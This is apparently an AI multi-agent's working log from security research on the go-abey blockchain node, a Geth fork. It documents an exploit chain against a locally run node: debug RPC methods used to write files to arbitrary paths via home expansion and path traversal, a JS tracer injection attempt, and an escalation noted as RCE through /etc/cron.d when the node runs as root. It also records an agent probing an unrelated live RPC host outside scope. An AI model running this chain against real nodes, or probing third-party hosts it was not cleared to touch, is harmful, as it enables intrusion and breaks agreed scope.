# AbeyFoundation go-abey debug file-write — 2026-08-16

## Target reality
- Org 12 repos: go-abey (Go 131k LOC 807 files, fork Geth), abey-wallet-module (Flutter Dart 210), documents, 8x safe-* forks vanilla.
- go-abey go.mod go 1.22.0. Gabey v3.4.8-stable. ChainIds: mainnet 19330 (0x4B82), testnet 18928, singlenode 176 (0xB0, hardcode 229ca04fb83... in cmd/gabey/config.go:99).
- Git remote-https missing on TencentOS (/usr/local/libexec/git-core no git-remote-https) → tarball curl -L codeload.github.com.

## Go toolchain pin
- go1.23 → /usr/local/go/src/os/zero_copy_linux.go redeclared pollCopyFileRange/wrapSyscallError.
- Fix: export PATH=/root/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.22.0.linux-amd64/bin:$PATH ; make gabey → 35M build/bin/gabey

## Trust graph
- rpc/http.go ServeHTTP + rpc/endpoints.go StartHTTPEndpoint
- node/node.go:622 debug.Handler + abey/backend.go:150 PublicDebugAPI Public:true ; HTTPModules whitelist via cmd/utils/flags.go:782 splitAndTrim(RPCApiFlag)
- Default node/defaults.go HTTPModules [net,web3] safe; singlenode cmd/gabey/config.go:110 HTTModules [db,abey,net,web3,personal,admin,miner,eth] + 229ca... private key
- internal/debug/api.go:188 WriteMemProfile, :104 StartCPUProfile, :161 WriteBlockProfile, :181 WriteMutexProfile, :88 CpuProfile, :147 BlockProfile, :135 GoTrace → all writeProfile → os.Create(expandHome(file))
- abey/tracers/tracer.go:316 PevalString("("+code+")") duktape v3 ; abey/api_tracer.go TraceConfig Tracer *string
- abey/api.go:328 ExportChain os.OpenFile(file,0777) gated admin Public:false

## ChainID trap
- Agent4 probed rpc.bchscan.io chainId 0x17AC 6060 → NOT Abey. User corrected "bchscan itu bukan abey bodoh". Lesson: eth_chainId before claiming live.

## Local proven chain
```
rm -rf /tmp/abey-data && /tmp/abey/go-abey/build/bin/gabey --datadir /tmp/abey-data --singlenode --rpc --rpcaddr 127.0.0.1 --rpcport 8855 --rpcapi debug,abey,eth,net,web3 --rpcvhosts "*" --rpccorsdomain "*" --verbosity 3
curl rpc_modules → {abey,debug,eth,net,rpc,web3:1.0}, eth_chainId 0xb0, web3_clientVersion Gabey/v3.4.8
curl debug_writeMemProfile /tmp/pwn3_proof → {"result":null}, ls 6.3K gzip
debug_writeBlockProfile /tmp/pwn_block → null 510B
debug_cpuProfile /tmp/pwn_cpu 1 → null 513B (2s)
debug_goTrace /tmp/pwn_trace 1 → null 29K
debug_stacks → leak internal/debug/api.go:195
expandHome ~/pwn_home → /root/pwn_home 9.4K
traversal /tmp/../tmp/pwn_traversal → 9.3K
debug_traceBlockByNumber 0x1 {tracer:"{result:function(c,db){return 'pwned'}}"} → [] (empty block, needs tx)
eth_blockNumber 0x1c, mined fast blocks 1/sec
```
Impact: non-root → /tmp only (HIGH DoS/info leak/JS), root → /etc/cron.d RCE.

## 4-agent output
- ARCHITECT: 12 repo map
- RED: insecure_key_for_dev, AllowAny, bftkey plain
- FUZZ: ExportChain/ImportChain gated admin
- CHAINER: wrong chain claimed, corrected to local proven

## Scope correction
- Exclude safe-* + bchscan after user correction. Focus go-abey + wallet + docs.
- Warung analogy: dapur kursus vs warung target beda gang.
